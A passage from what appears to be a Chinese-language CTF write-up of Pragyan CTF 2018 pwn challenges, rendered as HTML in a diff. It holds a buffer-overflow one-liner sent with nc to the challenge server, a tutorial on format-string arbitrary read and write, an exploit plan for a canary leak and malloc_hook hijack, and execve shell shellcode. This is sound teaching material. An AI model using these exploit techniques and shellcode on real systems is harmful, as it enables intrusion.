class="line">-0000000000000032                 db ? ; undefined</span><br><span class="line">-0000000000000031                 db ? ; undefined</span><br><span class="line">-0000000000000030 var_30          dq ?</span><br><span class="line">-0000000000000028 anonymous_0     dq ?</span><br><span class="line">-0000000000000020 anonymous_1     dq ?</span><br><span class="line">-0000000000000018 anonymous_2     dq ?</span><br><span class="line">-0000000000000010 anonymous_3     dd ?</span><br><span class="line">-000000000000000C anonymous_4     db ?</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure>
+<p>s1需填充0x10即16个字节，v8填充36个字节。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;print &quot;kaiokenx20\x00&quot;+&quot;\x00&quot;*5+&quot;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;flag.txt\x00\n&quot;+&quot;8&quot;&#39;|nc 128.199.224.175 13000</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ python -c &#39;print &quot;kaiokenx20\x00&quot;+&quot;\x00&quot;*5+&quot;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;flag.txt\x00\n&quot;+&quot;8&quot;&#39;|nc 128.199.224.175 13000</span><br><span class="line"></span><br><span class="line">Enter password to authentic yourself : Enter case number: </span><br><span class="line"></span><br><span class="line">	 1) Application_1</span><br><span class="line">	 2) Application_2</span><br><span class="line">	 3) Application_3</span><br><span class="line">	 4) Application_4</span><br><span class="line">	 5) Application_5</span><br><span class="line">	 6) Application_6</span><br><span class="line">	 7) Flag</span><br><span class="line"></span><br><span class="line">	 Enter choice :- </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">The flag is :- pctf&#123;bUff3r-0v3Rfl0wS&#96;4r3.alw4ys-4_cl4SsiC&#125;</span><br><span class="line">r�</span><br><span class="line"></span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
+<h1 id="Unbreakable-encryption-350pts"><a href="#Unbreakable-encryption-350pts" class="headerlink" title="Unbreakable encryption (350pts)"></a>Unbreakable encryption (350pts)</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Your friend, Liara, has encrypted all her life secrets, using the one of the best encryptions available in the world, the AES. She has challenged you that no matter what, you can never read her life secrets.</span><br><span class="line"></span><br><span class="line">The encryption service is running at :- 128.199.224.175:33000</span><br><span class="line">The binary file is named aes_enc.</span><br><span class="line"></span><br><span class="line">Her encrypted life secrets are as follows :-</span><br><span class="line"></span><br><span class="line">0000 - 40 87 68 1a b0 23 73 c4 61 44 b4 c0 21 f1 63 0b @.h..#s.aD..!.c.</span><br><span class="line">0010 - 73 e9 0d 38 e4 bd d8 33 41 64 2c 43 85 d4 54 0e s..8...3Ad,C..T.</span><br><span class="line">0020 - f5 bc 8c 02 db ee 0d e8 d6 29 81 3a 5f cb 63 bd .........).:_.c.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Note: Since some teams were having issues with the buffering of the I&#x2F;O streams when executing the binary remotely, we have updated the binary file, to flush the output streams properly. The modified binary is named aes_enc_unbf, and will be running on 128.199.224.175:33100</span><br></pre></td></tr></table></figure>
+<h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/pragyan2018/unbreakable_encryption" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/pragyan2018/unbreakable_encryption</a></p>
+<h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>pwn题中，有形如下述代码的形式就是格式化字符串漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure>
+<p>也许使用者的目的只是直接输出字符串，但是这段字符串来源于可控的输入，就造成了漏洞。<br>示例程序如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(str)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译：<code>gcc -m32 -o str str.c</code><br>输入：<code>%2$x</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142756.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142805.jpg" alt=""><br>原因是如果直接printf(“占位符”)这种形式，就会把栈上的偏移当做数据输出出来。通过构造格式化串，就可以实现任意地址读和任意地址写。</p>
+<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>事实上，我们在scanf(或者read)来输入字符串的时候，字符串就已经在栈中了，如图，可以看出偏移为6。如果我们构造出<code>addr(4字节)%6$s</code>，就能读取这个地址的值了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142854.jpg" alt=""><br>我们尝试一下，输入<code>AAAA%6$s</code>，当然不可能真的读到地址为41414141的内存值，不过从下图我框起来的内容就知道，如果我们输入一个合法的值，就可以读了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-05-142934.jpg" alt=""></p>
+<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>和上面的任意地址读是同理的，只不过利用了格式化字符串的一个比较冷门的特性，%n。<br>这个占位符可以把它前面输出的字符的数量，写入指定的地址。<br>比如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"abc%n"</span>, &amp;val);</span><br></pre></td></tr></table></figure>
+<p>val的值就被改变为3。</p>
+<h3 id="64位格式化字符串"><a href="#64位格式化字符串" class="headerlink" title="64位格式化字符串"></a>64位格式化字符串</h3><p>下述示例来源于RE4B。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d</span></span><br><span class="line"><span class="string">"</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>linux上优先使用RDI，RSI，RDX，RCX，R8，R9寄存器传递前6个参数，然后利用栈传递其余参数。<br>汇编代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">    .string &quot;a&#x3D;%d; b&#x3D;%d; c&#x3D;%d; d&#x3D;%d; e&#x3D;%d; f&#x3D;%d; g&#x3D;%d; h&#x3D;%d</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">    sub     rsp, 40</span><br><span class="line"></span><br><span class="line">    mov     r9d, 5 #第6个参数</span><br><span class="line">    mov     r8d, 4 #第5个参数</span><br><span class="line">    mov     ecx, 3 #第4参数</span><br><span class="line">    mov     edx, 2 #第3个参数</span><br><span class="line">    mov     esi, 1 #第2个参数</span><br><span class="line">    mov     edi, OFFSET FLAT:.LC0 #第1个参数</span><br><span class="line">    xor     eax, eax ; number of vector registers passed</span><br><span class="line">    mov     DWORD PTR [rsp+16], 8 #第9个参数</span><br><span class="line">    mov     DWORD PTR [rsp+8], 7 #第8个参数</span><br><span class="line">    mov     DWORD PTR [rsp], 6 #第7个参数</span><br><span class="line">    call    printf</span><br><span class="line"></span><br><span class="line">    ; return 0</span><br><span class="line"></span><br><span class="line">    xor     eax, eax</span><br><span class="line">    add     rsp, 40</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
+<p>所以有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info registers</span><br><span class="line">rax     0x0     0</span><br><span class="line">rbx     0x0     0</span><br><span class="line">rcx     0x3     3</span><br><span class="line">rdx     0x2     2</span><br><span class="line">rsi     0x1     1</span><br><span class="line">rdi     0x400628 4195880</span><br><span class="line">rbp     0x7fffffffdf60 0x7fffffffdf60</span><br><span class="line">rsp     0x7fffffffdf38 0x7fffffffdf38</span><br><span class="line">r8      0x4     4</span><br><span class="line">r9      0x5     5</span><br><span class="line">r10     0x7fffffffdce0 140737488346336</span><br><span class="line">r11     0x7ffff7a65f60 140737348263776</span><br><span class="line">r12     0x400440 4195392</span><br><span class="line">r13     0x7fffffffe040 140737488347200</span><br><span class="line">r14     0x0     0</span><br><span class="line">r15     0x0     0</span><br><span class="line">rip     0x7ffff7a65f60 0x7ffff7a65f60 &lt;__printf&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x&#x2F;10g $rsp</span><br><span class="line">0x7fffffffdf38: 0x0000000000400576 -&gt; 返回地址 0x0000000000000006</span><br><span class="line">0x7fffffffdf48: 0x0000000000000007 0x00007fff00000008</span><br><span class="line">0x7fffffffdf58: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7fffffffdf68: 0x00007ffff7a33de5 0x0000000000000000</span><br><span class="line">0x7fffffffdf78: 0x00007fffffffe048 0x0000000100000000</span><br></pre></td></tr></table></figure>
+<p><strong>所以在64位格式化字符串漏洞利用时，要注意如何计算偏移，因为即使没有占位符，我们依然是按照这个传参规则来读取变量的。</strong></p>
+<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a><a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">fmtstr</a></h4><p>上面说过我们要利用格式化串漏洞就要得到格式化串的偏移,pwntools有自动化代码可以得到这个偏移。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="keyword">print</span> autofmt.offset</span><br></pre></td></tr></table></figure>
+<h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><p>生成任意地址写的payload的函数.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;key: value&#125;)</span><br></pre></td></tr></table></figure>
+<p>fmtstr_payload有两个参数</p>
+<ul>
+<li>第一个参数是int，用于表示取参数的偏移个数</li>
+<li>第二个参数是字典，字典的意义是往key的地址，写入value的值</li>
+</ul>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ checksec aes_enc_unbf </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;sakura&#x2F;unbreakable_encryption&#x2F;aes_enc_unbf&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ ldd aes_enc_unbf </span><br><span class="line">	not a dynamic executable</span><br></pre></td></tr></table></figure>
+<h3 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ .&#x2F;aes_enc_unbf </span><br><span class="line"></span><br><span class="line">Enter message :- </span><br><span class="line">sakura</span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">sakura</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - b2 c4 08 6e 77 66 cb 59-b3 6a 4a 8b ed 35 98 05   ...nwf.Y.jJ..5..</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">sakura</span><br></pre></td></tr></table></figure>
+<p>读取输入并打印，并将其传递给encrypt，加载aes文件，加密消息并将其输出到屏幕。<br>然后它调用decrypt解密，并将明文输出到屏幕上。</p>
+<h3 id="栈溢出-1"><a href="#栈溢出-1" class="headerlink" title="栈溢出"></a>栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v5; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line"><span class="keyword">char</span> v6; <span class="comment">// [esp+8Bh] [ebp-Dh]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Enter message :- "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v5); <span class="comment">//bug</span></span><br></pre></td></tr></table></figure>
+<p>scanf处存在栈溢出，上一个题的前置知识已经说过了。<br>不过这个题因为有canary，所以不能用来直接getshell，我们要想其他方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ .&#x2F;aes_enc_unbf </span><br><span class="line"></span><br><span class="line">Enter message :- </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - d5 55 d2 b4 58 fb d3 04-16 cd 58 fb 63 0f ea 16   .U..X.....X.c...</span><br><span class="line">0010 - 9f ce d0 d3 0a 9a 15 c8-ab aa 76 69 00 18 78 1b   ..........vi..x.</span><br><span class="line">0020 - e6 1d c0 01 bf 44 f1 e5-dc 22 ba 2a ae d2 e3 f4   .....D...&quot;.*....</span><br><span class="line">0030 - 39 7b fb f1 fb 99 79 b7-b9 16 f7 37 3d a1 4c 38   9&#123;....y....7&#x3D;.L8</span><br><span class="line">0040 - 16 75 9d b2 23 60 0a a2-91 12 7c 22 e2 8e 90 83   .u..#&#96;....|&quot;....</span><br><span class="line">0050 - b1 60 46 2d 7b e3 18 12-65 62 85 db e5 95 fe 1f   .&#96;F-&#123;...eb......</span><br><span class="line">0060 - b2 11 7e 38 43 05 4f d2-28 84 5a c7 39 2c 06 41   ..~8C.O.(.Z.9,.A</span><br><span class="line">0070 - f1 ee 61 c6 1c b6 e7 52-b3 fd 8c 30 16 bb 6c 38   ..a....R...0..l8</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***: .&#x2F;aes_enc_unbf terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
+<h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+8Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter message :- "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v5);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nYour message is :- "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;v5);<span class="comment">//bug</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为静态链接，所以不能改写GOT表，考虑使用malloc_hook来解题，可以参考0ctf的easiestprintf。<br>其次因为有canary，所以要先leak出canary。<br>所以总的思路就出来了：</p>
+<ol>
+<li>通过格式化字符串的任意地址读写leak出canary的值，并劫持malloc_hook，使其指向main函数。<br>这样当执行malloc的时候，就会跳回main函数，然后重新执行程序。</li>
+<li>然后我们修改_stack_prot的值为0x7，之后再次跳回main函数。</li>
+<li>最后将malloc_hook的值还原为0，不再跳回main函数，然后因为之前已经leak出了canary的值，就可以触发栈溢出，将返回地址设置为_dl_make_stack_executable，并传入参数_libc_stack_end，因为之前_stack_prot的值已经被设置为0x7，这个函数将会使得栈可执行，取消NX保护，最后跳回我们预先写好的shellcode就可以getshell了。<h3 id="准备shellcode"><a href="#准备shellcode" class="headerlink" title="准备shellcode"></a>准备shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x1000:	xor		eax, eax</span><br><span class="line">0x1002:	push		eax</span><br><span class="line">0x1003:	push		0x68732f2f</span><br><span class="line">0x1008:	push		0x6e69622f</span><br><span class="line">0x100d:	push		eax</span><br><span class="line">0x100e:	push		eax</span><br><span class="line">0x100f:	pop		ecx</span><br><span class="line">0x1010:	pop		edx</span><br><span class="line">0x1011:	mov		ebx, esp</span><br><span class="line">0x1013:	push		0x5b</span><br><span class="line">0x1015:	pop		eax</span><br><span class="line">0x1016:	xor		al, 0x50</span><br><span class="line">0x1018:	int		0x80</span><br><span class="line">0x101a:</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x50\x50\x59\x5A\x89\xE3\x6A\x5B\x58\x34\x50\xCD\x80</span><br></pre></td></tr></table></figure>
+<h3 id="准备参数"><a href="#准备参数" class="headerlink" title="准备参数"></a>准备参数</h3></li>
+</ol>
+<ul>
+<li><p>dl_make_stack_executable</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __usercall dl_make_stack_executable@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != _libc_stack_end )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v1 = a1;</span><br><span class="line">  result = mprotect(*a1 &amp; -dl_pagesize, dl_pagesize, _stack_prot);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> __readgsdword(<span class="number">0xFFFFFFE8</span>);</span><br><span class="line">  *v1 = <span class="number">0</span>;</span><br><span class="line">  dl_stack_flags |= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
